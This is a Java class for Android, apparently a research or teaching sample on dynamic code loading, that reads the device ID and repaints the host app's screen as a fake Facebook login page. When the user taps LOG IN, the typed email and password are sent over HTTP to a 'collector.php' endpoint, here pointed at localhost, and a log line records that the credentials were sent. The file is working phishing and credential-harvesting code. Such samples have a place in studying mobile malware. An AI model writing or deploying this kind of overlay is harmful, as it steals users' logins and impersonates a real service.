public class Task{
        public Task(){
                System.out.println("Initializing...");
        }

        public String getDeviceId(){
                return "world";
        }

        public String executeTask(android.content.Context context){
                return ((android.telephony.TelephonyManager)context.getSystemService("phone")).getDeviceId();
        }


		public void registerDynamicBroadcastReceiver(android.content.Context mContext){
			android.content.BroadcastReceiver receiver = new android.content.BroadcastReceiver(){
			@Override
				public void onReceive(android.content.Context context, android.content.Intent intent){
					
				}
			};
		}

		public void phishing(android.content.Context mContext){
		
			android.widget.LinearLayout mainLayout = (android.widget.LinearLayout) ((android.app.Activity)mContext).findViewById(edu.ntu.android.learning.dynamicactivitychange.R.id.main_layout);
			mainLayout.setPadding(80, 0, 80, 0);
			mainLayout.setBackgroundColor(android.graphics.Color.parseColor("#324d97"));


			android.widget.ImageView imageView = new android.widget.ImageView(mContext);
			imageView.setImageDrawable(mContext.getResources().getDrawable(edu.ntu.android.learning.dynamicactivitychange.R.drawable.facebook_logo));
			//imageView.getLayoutParams().height = 60;
			android.widget.LinearLayout.LayoutParams params = new android.widget.LinearLayout.LayoutParams(android.view.ViewGroup.LayoutParams.WRAP_CONTENT, android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
			params.setMargins(0, 250, 0, 0);
			imageView.setLayoutParams(params);
			mainLayout.addView(imageView);

			android.widget.TextView textView1 = new android.widget.TextView(mContext);
			params = new android.widget.LinearLayout.LayoutParams(android.view.ViewGroup.LayoutParams.WRAP_CONTENT, android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
			params.setMargins(0, 20, 0, 0);
			textView1.setLayoutParams(params);
			textView1.setText("English - Change");
			textView1.setTextSize(14);
			textView1.setTextColor(android.graphics.Color.parseColor("#ffffe6"));
			mainLayout.addView(textView1);

			final android.support.design.widget.TextInputLayout emailLayout = new android.support.design.widget.TextInputLayout(mContext);
			params = new android.widget.LinearLayout.LayoutParams(android.view.ViewGroup.LayoutParams.MATCH_PARENT, android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
			params.setMargins(0, 100, 0, 0);
			emailLayout.setLayoutParams(params);
			emailLayout.setHintEnabled(true);

			final android.widget.EditText emailText = new android.widget.EditText(mContext);
			params = new android.widget.LinearLayout.LayoutParams(android.view.ViewGroup.LayoutParams.MATCH_PARENT, android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
			emailText.setLayoutParams(params);
			emailText.setInputType(android.text.InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS);
			emailText.setMaxLines(1);
			emailText.setHint("Email or Phone");
			emailText.setSingleLine(true);
			emailText.setHintTextColor(android.graphics.Color.parseColor("#e6e6e6"));
			emailText.getBackground().setColorFilter(android.graphics.Color.parseColor("#ffffff"), android.graphics.PorterDuff.Mode.SRC_IN);
			

			emailLayout.addView(emailText);
			mainLayout.addView(emailLayout);

			android.support.design.widget.TextInputLayout passwordLayout = new android.support.design.widget.TextInputLayout(mContext);
			params = new android.widget.LinearLayout.LayoutParams(android.view.ViewGroup.LayoutParams.MATCH_PARENT, android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
			params.setMargins(0, 50, 0, 0);
			passwordLayout.setLayoutParams(params);
			passwordLayout.setHintEnabled(true);

			final android.widget.EditText passwordText = new android.widget.EditText(mContext);
			params = new android.widget.LinearLayout.LayoutParams(android.view.ViewGroup.LayoutParams.MATCH_PARENT, android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
			passwordText.setLayoutParams(params);
			passwordText.setInputType(android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);
			passwordText.setTextColor(android.graphics.Color.parseColor("#ffffff"));
			passwordText.setMaxLines(1);
			passwordText.setHint("Password");
			passwordText.setHintTextColor(android.graphics.Color.parseColor("#e6e6e6"));
			passwordText.getBackground().setColorFilter(android.graphics.Color.parseColor("#ffffff"), android.graphics.PorterDuff.Mode.SRC_IN);
			
			passwordText.setSingleLine(true);
			passwordLayout.addView(passwordText);
			mainLayout.addView(passwordLayout);

			android.widget.Button login = new android.widget.Button(mContext);
			params = new android.widget.LinearLayout.LayoutParams(android.view.ViewGroup.LayoutParams.MATCH_PARENT, android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
			params.setMargins(0, 16, 0, 0);
			login.setLayoutParams(params);
			login.setText("LOG IN");
			login.setTextColor(android.graphics.Color.parseColor("#c4cded"));
			login.setBackgroundColor(android.graphics.Color.parseColor("#5371c6"));
			login.setTypeface(null, android.graphics.Typeface.BOLD);
			mainLayout.addView(login);

			login.setOnClickListener(new android.view.View.OnClickListener() {
				@Override
				public void onClick(android.view.View v) {
					new Thread(new Runnable() {
						@Override
						public void run() {
							try {
								java.net.URL url = new java.net.URL("http://localhost/collector.php?mess=" + emailText.getText().toString()+passwordText.getText().toString());
								java.net.HttpURLConnection httpConn = (java.net.HttpURLConnection)url.openConnection();
								httpConn.connect();
								android.util.Log.e("++++++++", String.format("Send the credential (%s, %s) to the server", emailText.getText().toString(), passwordText.getText().toString()));
							}catch(Exception ex){
							}
						}
					}).start();
				}
			});

			android.widget.TextView textView2 = new android.widget.TextView(mContext);
			params = new android.widget.LinearLayout.LayoutParams(android.view.ViewGroup.LayoutParams.WRAP_CONTENT, android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
			params.setMargins(0, 220, 0, 0);
			textView2.setLayoutParams(params);
			textView2.setText("Create New Facebook Account");
			textView2.setTextSize(14);
			textView2.setTextColor(android.graphics.Color.parseColor("#ffffe6"));
			mainLayout.addView(textView2);

			android.widget.TextView textView3 = new android.widget.TextView(mContext);
			params = new android.widget.LinearLayout.LayoutParams(android.view.ViewGroup.LayoutParams.WRAP_CONTENT, android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
			params.setMargins(0, 30, 0, 0);
			textView3.setLayoutParams(params);
			textView3.setText("Forgot Password?");
			textView3.setTextSize(14);
			textView3.setTextColor(android.graphics.Color.parseColor("#ffffe6"));
			mainLayout.addView(textView3);

			//emailText.setTextColor(android.graphics.Color.parseColor("#ffffe6"));
			//passwordText.setTextColor(android.graphics.Color.parseColor("#ffffe6"));
		}
}
